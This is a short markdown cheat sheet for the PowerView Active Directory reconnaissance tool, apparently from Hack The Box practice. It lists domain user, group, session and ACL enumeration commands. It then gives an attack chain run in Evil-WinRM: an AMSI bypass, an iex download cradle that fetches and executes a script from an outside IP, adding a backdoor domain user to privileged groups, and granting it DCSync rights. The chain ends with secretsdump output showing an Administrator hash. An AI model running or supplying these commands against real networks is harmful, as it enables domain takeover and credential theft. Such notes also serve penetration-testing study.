# Name
PowerView

## Usage
```
# Domain Users Enum
Get-NetUser | select samaccountname, lastlogon

# Domain Groups Enum
# Able to see local groups as well
Get-NetGroup | select samaccountname

# Group members Enum
# Able to see subgroups as well
Get-NetGroup "Sales Department" | select member

# Computer OS Enum
Get-NetComputer | select operatingsystem, dnshostname

# Resolve Domain Names to IP Addresses
Resolve-IPAddress CLIENT76.corp.com

# Test if current account has localadmin privileges on domain hosts
Find-LocalAdminAccess

# Sees if someone logs into the box
Get-NetSession -ComputerName files04 -verbose

# Finds GenericAll Permissions on Management Department Group
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

# Converts SID to Name
"S-1-5-21-1987370270-658905905-1781884369-512", "S-1-5-21-1987370270-658905905-1781884369-1104", "S-1-5-32-548", "S-1-5-18", "S-1-5-21-1987370270-658905905-1781884369-519" | Convert-SidToName

# Finds GenericAll Permissions on Jen User
Get-ObjectAcl -Identity "jen" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights

## Add user with DCsync access rights to dump administrator's hash
*Evil-WinRM* PS C:\temp> Bypass-4MSI
*Evil-WinRM* PS C:\temp> iex(new-object net.webclient).downloadstring('http://10.10.14.4/PowerView.ps1')
*Evil-WinRM* PS C:\temp> net user john abc123! /add /domain
*Evil-WinRM* PS C:\temp> net group "Exchange Windows Permissions" john /add
*Evil-WinRM* PS C:\temp> net localgroup "Remote Management Users" john /add
*Evil-WinRM* PS C:\temp> $pass = convertto-securestring 'abc123!' -asplain -force
*Evil-WinRM* PS C:\temp> $cred = new-object system.management.automation.pscredential('htb\john', $pass)
*Evil-WinRM* PS C:\temp> Add-ObjectACL -PrincipalIdentity john -Credential $cred -Rights DCSync

secretsdump.py htb/john@10.10.10.161
#[*] Using the DRSUAPI method to get NTDS.DIT secrets
#htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
```

## Source
https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1
another_powerview.ps1 source is unknown.
